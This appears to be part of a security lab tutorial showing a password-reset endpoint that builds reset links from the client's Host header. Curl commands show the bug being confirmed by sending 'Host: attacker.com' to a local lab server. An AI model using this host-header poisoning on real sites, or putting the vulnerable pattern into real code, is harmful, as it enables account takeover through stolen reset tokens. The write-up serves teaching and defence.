# Finding the Bug

## Locating the Vulnerable Code

The reset endpoint in `lab/app.py` contains this logic:

```python
@app.route('/reset-password', methods=['POST'])
def reset_password():
    data = request.get_json(force=True) or {}
    email = data.get('email', '')
    user = next((u for u, d in USERS.items() if d['email'] == email), None)
    if not user:
        return jsonify({'message': 'If that email exists, a reset link has been sent.'})
    token = secrets.token_hex(16)
    RESET_TOKENS[token] = user
    # Bug: uses request.host to build the reset URL
    host = request.headers.get('Host', 'localhost:8090')
    reset_url = f"http://{host}/reset?token={token}"
    EMAIL_SPOOL.append({'to': email, 'subject': 'Password Reset', 'body': f"Click here: {reset_url}"})
    return jsonify({'message': 'If that email exists, a reset link has been sent.'})
```

The bug is on the line that reads `request.headers.get('Host', ...)`. The application uses whatever the client sent in the `Host` header as the domain for the reset URL.

## Confirming the Bug

Send a normal reset request and inspect the debug email:

```bash
curl -s -X POST http://127.0.0.1:8090/reset-password \
    -H "Content-Type: application/json" \
    -d '{"email": "admin@lab.internal"}'

curl -s http://127.0.0.1:8090/debug/last-email
```

The link in the email body uses `127.0.0.1:8090` because that is what the client's browser would send. Now try injecting a custom `Host`:

```bash
curl -s -X POST http://127.0.0.1:8090/reset-password \
    -H "Content-Type: application/json" \
    -H "Host: attacker.com" \
    -d '{"email": "admin@lab.internal"}'

curl -s http://127.0.0.1:8090/debug/last-email
```

The link in the email now contains `attacker.com`. The token is still valid on the real server.
